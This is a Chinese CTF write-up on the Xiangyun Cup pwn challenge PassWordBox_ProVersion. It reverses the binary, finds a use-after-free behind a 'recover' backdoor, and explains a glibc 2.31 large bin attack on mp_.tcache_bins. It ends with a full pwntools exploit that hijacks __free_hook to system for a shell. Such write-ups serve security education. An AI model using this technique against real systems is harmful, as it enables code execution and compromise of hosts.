> 原文链接: https://www.anquanke.com//post/id/251329 


# 从祥云杯PassWordBox_ProVersion看GLIBC2.31 LargeBin Attack


                                阅读量   
                                **20328**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t012e45c0a9f3c44664.jpg)](https://p5.ssl.qhimg.com/t012e45c0a9f3c44664.jpg)



在我的印象中large bin attack在glibc 2.27之后就没办法使用了，但是这周末打了祥云杯中的一道题目，让我见识到了Glibc 2.31下 Large bin attack的再次利用。

## 题目分析

首先看一下题目的简介

```
小鸟上一次使用的免费版本密码暂存箱不幸发生了数据泄露时间，据悉原因是系统版本较老且开发随便导致的。小鸟听说专业付费版的密码暂存箱功能更多，且炒鸡安全，不仅系统版本新还修复了以往的漏洞，真是太超值了！
```

没什么需要注意的地方，接着我们逆向分析一下题目。题目的逻辑很简单，就是一个菜单题目，但是由于IDA暂时没办法分析jmp eax这种的switch case语句的反汇编，因此这里我们直接看汇编代码，根据menu中指定的内容来判断函数。

```
.text:0000000000001BDC                 db      3Eh
.text:0000000000001BDC                 jmp     rax
.text:0000000000001BDC main            endp
.text:0000000000001BDC
.text:0000000000001BDF ; ---------------------------------------------------------------------------
.text:0000000000001BDF                 mov     eax, 0
.text:0000000000001BE4                 call    add
.text:0000000000001BE9                 jmp     short loc_1C25
.text:0000000000001BEB ; ---------------------------------------------------------------------------
.text:0000000000001BEB                 mov     eax, 0
.text:0000000000001BF0                 call    edit
.text:0000000000001BF5                 jmp     short loc_1C25
.text:0000000000001BF7 ; ---------------------------------------------------------------------------
.text:0000000000001BF7                 mov     eax, 0
.text:0000000000001BFC                 call    delete
.text:0000000000001C01                 jmp     short loc_1C25
.text:0000000000001C03 ; ---------------------------------------------------------------------------
.text:0000000000001C03                 mov     eax, 0
.text:0000000000001C08                 call    show
.text:0000000000001C0D                 jmp     short loc_1C25
.text:0000000000001C0F ; ---------------------------------------------------------------------------
.text:0000000000001C0F                 mov     eax, 0
.text:0000000000001C14                 call    recover
.text:0000000000001C19                 jmp     short loc_1C25
.text:0000000000001C1B ; ---------------------------------------------------------------------------
.text:0000000000001C1B                 mov     edi, 8
.text:0000000000001C20                 call    _exit
.text:0000000000001C25 ; ---------------------------------------------------------------------------
.text:0000000000001C25
.text:0000000000001C25 loc_1C25:                               ; CODE XREF: .text:0000000000001BE9↑j
```

接着我们分别分析一下这几个函数，首先是add函数

```
v3 = __readfsqword(0x28u);
  LODWORD(size) = 0;
  puts("Which PwdBox You Want Add:");
  __isoc99_scanf("%u", (char *)&amp;size + 4);
  if ( HIDWORD(size) &lt;= 0x4F )
  `{`
    printf("Input The ID You Want Save:");
    getchar();
    read(0, (char *)&amp;id_list + 0x20 * HIDWORD(size), 0xFuLL);
    *((_BYTE *)&amp;unk_406F + 0x20 * HIDWORD(size)) = 0;
    printf("Length Of Your Pwd:");
    __isoc99_scanf("%u", &amp;size);
    if ( (unsigned int)size &gt; 0x41F &amp;&amp; (unsigned int)size &lt;= 0x888 )
    `{`
      new_buf = (char *)malloc((unsigned int)size);
      printf("Your Pwd:");
      getchar();
      fgets(new_buf, size, stdin);
      encrypt_password((__int64)new_buf, size);
      *((_DWORD *)&amp;size_list + 8 * HIDWORD(size)) = size;
      *((_QWORD *)&amp;buf_list + 4 * HIDWORD(size)) = new_buf;
      recover_list[8 * HIDWORD(size)] = 1;
      if ( !is_first_add )
      `{`
        printf("First Add Done.Thx 4 Use. Save ID:%s", *((const char **)&amp;buf_list + 4 * HIDWORD(size)));
        is_first_add = 1LL;
      `}`
    `}`
    else
    `{`
      puts("Why not try To Use Your Pro Size?");
    `}`
  `}`
  return __readfsqword(0x28u) ^ v3;
`}`
```

函数的逻辑很简单，首先就是输入id，然后输入一个size分配我们指定大小的堆块，接着将我们输入的passwd字符串加密存储在刚刚申请的堆块上，这里需要注意的是这里的size存在一个大小范围也就是 `0x41f&lt;size&lt;0x888` ，那么这里申请的大小在释放的时候就无法进入到tcache和fastbin以及small bin链表中，也就是说我们申请的都是large bin大小的堆块。接着值得我们注意的就是这里存在一个is_alive的选项也就是上面代码中的recover_list这个数组，之后我们在分析。

接着就是edit函数

```
unsigned __int64 edit()
`{`
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which PwdBox You Want Edit:");
  __isoc99_scanf("%u", &amp;v1);
  getchar();
  if ( v1 &lt;= 0x4F )
  `{`
    if ( recover_list[8 * v1] )
      read(0, *((void **)&amp;buf_list + 4 * v1), *((unsigned int *)&amp;size_list + 8 * v1));
    else
      puts("No PassWord Store At Here");
  `}`
  return __readfsqword(0x28u) ^ v2;
`}`
```

我们看到这里的edit函数就是按照之前我们申请的大小，向相应的堆空间中输入内容，需要注意的是，这里我们输入的内容并没有被加密。接着是show函数

```
unsigned __int64 show()
`{`
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which PwdBox You Want Check:");
  __isoc99_scanf("%u", &amp;v1);
  getchar();
  if ( v1 &lt;= 0x4F )
  `{`
    if ( recover_list[8 * v1] )
    `{`
      sub_14DB(*((_QWORD *)&amp;buf_list + 4 * v1), *((_DWORD *)&amp;size_list + 8 * v1));
      printf(
        "IDX: %d\nUsername: %s\nPwd is: %s",
        v1,
        (const char *)&amp;id_list + 32 * v1,
        *((const char **)&amp;buf_list + 4 * v1));
      encrypt_password(*((_QWORD *)&amp;buf_list + 4 * v1), *((_DWORD *)&amp;size_list + 8 * v1));
    `}`
    else
    `{`
      puts("No PassWord Store At Here");
    `}`
  `}`
  return __readfsqword(0x28u) ^ v2;
`}`
```

这里我们看到show函数就是将堆块中的内容进行一个解密操作进行输出，接着是delete函数

```
unsigned __int64 delete()
`{`
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Idx you want 2 Delete:");
  __isoc99_scanf("%u", &amp;v1);
  if ( v1 &lt;= 0x4F &amp;&amp; recover_list[8 * v1] )
  `{`
    free(*((void **)&amp;buf_list + 4 * v1));
    recover_list[8 * v1] = 0;
  `}`
  return __readfsqword(0x28u) ^ v2;
`}`
```

delete函数就是将我们指定的堆块释放掉，这里在释放时候为recover_list相应的内容赋值了0，那么这里就不存在一个UAF或者是DoubleFree的漏洞。那么还存在最后一个函数也就是recover函数

```
unsigned __int64 recover()
`{`
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Idx you want 2 Recover:");
  __isoc99_scanf("%u", &amp;v1);
  if ( v1 &lt;= 0x4F &amp;&amp; !recover_list[8 * v1] )
  `{`
    recover_list[8 * v1] = 1;
    puts("Recovery Done!");
  `}`
  return __readfsqword(0x28u) ^ v2;
`}`
```

可以看到这里recover函数是将recover_list中的位又重新置为了1，并且这里并没有进行堆块是否已经被释放了的检查，也就是说这里其实是一个后门，存在一个UAF的漏洞，我们可以在释放堆块之后，调用recover函数，那么就可以进行UAF的操作了。



## 漏洞利用

知道漏洞是一个UAF，并且这里的堆块范围是在large bin的范围内，那么就需要考虑Large bin Attack了。这里我们看一下large bin相应部分的源码

```
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);
fwd = bck-&gt;fd;

/* maintain large bins in sorted order */
if (fwd != bck)
  `{`
    /* Or with inuse bit to speed comparisons */
    size |= PREV_INUSE;
    /* if smaller than smallest, bypass loop below */
    assert (chunk_main_arena (bck-&gt;bk));
    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
      `{`
        fwd = bck;
        bck = bck-&gt;bk;

        victim-&gt;fd_nextsize = fwd-&gt;fd;
        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
      `}`
```

这一部分的代码是malloc源码中的一部分，代表的部分是当我们申请的大小usroted bin中现有的堆块的时候，glibc会首先将unsorted bin中的堆块放到相应的链表中，这一部分的代码就是将堆块放到large bin链表中的操作。当unsorted bin中的堆块的大小小于large bin链表中对应链中堆块的最小size的时候就会执行上述的代码。

我们看到在这一部分并没有针对large bin堆块中的fd_nextsize和bk_nextsize的相应的检查

```
if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)
    || __glibc_unlikely (size &gt; av-&gt;system_mem))
  malloc_printerr ("malloc(): invalid size (unsorted)");
if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)
    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))
  malloc_printerr ("malloc(): invalid next size (unsorted)");
if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))
  malloc_printerr ("malloc(): mismatching next-&gt;prev_size (unsorted)");
if (__glibc_unlikely (bck-&gt;fd != victim)
    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))
  malloc_printerr ("malloc(): unsorted double linked list corrupted");
if (__glibc_unlikely (prev_inuse (next)))
  malloc_printerr ("malloc(): invalid next-&gt;prev_inuse (unsorted)");
```

看前面也没有针对fd_nextsize和bk_nextsize的检查，也就是说虽然已经针对fd和bk进行了双向链表的检查，但是在large bin链表中并没有堆fd_nextsize和bk_nextsize进行双向链表完整性的检查，我们可以通过改写large bin的bk_nextsize的值来想指定的位置+0x20的位置写入一个堆地址，也就是这里存在一个任意地址写堆地址的漏洞。

那么我们如何利用这个漏洞呢，这里想到的就是覆写mp_.tcache_bins的值为一个很大的地址，这里我们看一下malloc中使用tcache部分的代码

```
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &amp;tbytes))
    `{`
      __set_errno (ENOMEM);
      return NULL;
    `}`
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx &lt; mp_.tcache_bins
      &amp;&amp; tcache
      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)
    `{`
      return tcache_get (tc_idx);
    `}`
  DIAG_POP_NEEDS_COMMENT;
#endif
```

我们看到这里的逻辑，也就是这里的mp_.tcache_bins的作用就相当于是global max fast，将其改成一个很大的地址之后，再次释放的堆块就会当作tcache来进行处理，也就是这里我们可以直接进行任意地址分配。之后覆写free_hook为system，进而getshell。

还有一个libc地址泄漏的问题，由于我们存在一个UAF，这里泄漏地址不成问题，但是存在一个问题就是泄漏出的地址是加密之后。这个加密算法其实很简单，就是一个简单的异或，通过将前8位全部置为0，泄漏得到的就是异或的key，之后异或解密就能拿到libc的基地址。



## EXP

```
# -*- coding: utf-8 -*-
from pwn import *

file_path = "./pwdPro"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    gdb.attach(p)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('', 0)
    libc = ELF('./libc.so')
    one_gadget = 0x0

def add(idx, size, ID='xxx', pwd='aa'):
    p.sendafter("Input Your Choice:", '1')
    p.sendlineafter("Which PwdBox You Want Add:", str(idx))
    p.sendafter("Input The ID You Want Save:", ID)
    p.sendlineafter("Length Of Your Pwd:", str(size))
    p.sendlineafter("Your Pwd:", pwd)

def show(idx):
    p.sendafter("Input Your Choice:", '3')
    p.sendlineafter("Which PwdBox You Want Check:", str(idx))

def delete(idx):
    p.sendafter("Input Your Choice:", '4')
    p.sendlineafter("Idx you want 2 Delete:", str(idx))

def edit(idx, con):
    p.sendafter("Input Your Choice:", '2')
    p.sendlineafter("Which PwdBox You Want Edit:", str(idx))
    p.send(con)

def recover(idx):
    p.sendafter("Input Your Choice:", '5')
    p.sendlineafter("Idx you want 2 Recover:", str(idx))

add(0, 0x448, pwd="\x00"*0x8)
p.recvuntil("Save ID:")
key = u64(p.recvn(8))
add(1, 0x500)
add(2, 0x438)
add(3, 0x500)
add(6, 0x500)
add(7, 0x500)

delete(0)
recover(0)
show(0)
p.recvuntil("Pwd is: ")
libc.address = (u64(p.recvn(8)) ^ key)-0x1ebbe0
log.success("libc address is `{``}`".format(hex(libc.address)))

add(4, 0x458)
delete(2)

recover(2)
show(2)
p.recvuntil("Pwd is: ")
ori_address = (u64(p.recvn(8)) ^ key)
log.success("ori libc address is `{``}`".format(hex(ori_address)))

payload = p64(ori_address)*2 + p64(0) +p64(libc.address + 0x1eb280 + 0x50 - 0x20)

edit(0, payload)
add(5, 0x458)

delete(7)
delete(6)
recover(6)
edit(6, p64(libc.sym['__free_hook']))

add(6, 0x500)
add(7, 0x500)
edit(7, p64(libc.sym['system']))
edit(1, "/bin/sh\x00")
delete(1)

p.interactive()
```
